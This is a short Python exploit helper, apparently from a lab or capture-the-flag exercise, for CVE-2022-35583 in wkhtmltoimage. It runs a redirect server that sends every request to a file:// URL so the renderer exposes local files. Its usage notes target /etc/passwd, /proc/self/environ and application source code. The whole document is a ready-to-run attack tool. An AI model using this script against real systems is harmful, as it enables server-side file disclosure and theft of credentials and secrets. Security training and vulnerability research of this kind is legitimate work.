#!/usr/bin/env python3
"""
Stage 1 helper: a one-page HTTP server that 302-redirects every request to a
file:// URL. This is the documented bypass for CVE-2022-35583 -- Qt's network
layer follows the redirect cross-scheme before WebKit's origin checks kick in,
so wkhtmltoimage ends up rendering the local file directly.

Usage:
    ./redirect_server.py [TARGET]

    TARGET defaults to file:///app/server.py. Examples:
        ./redirect_server.py file:///etc/passwd
        ./redirect_server.py file:///proc/self/environ

Then submit http://host.docker.internal:9000/ in the Short-link Generator UI.
"""

import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

DEFAULT_TARGET = "file:///app/server.py"
PORT = 9000


class RedirectHandler(BaseHTTPRequestHandler):
    target = DEFAULT_TARGET

    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", self.target)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def log_message(self, fmt, *args):
        sys.stderr.write(f"{self.address_string()} -> 302 {self.target}\n")


def main():
    if len(sys.argv) > 1:
        RedirectHandler.target = sys.argv[1]
    print(f"Listening on 0.0.0.0:{PORT}, redirecting -> {RedirectHandler.target}")
    HTTPServer(("0.0.0.0", PORT), RedirectHandler).serve_forever()


if __name__ == "__main__":
    main()
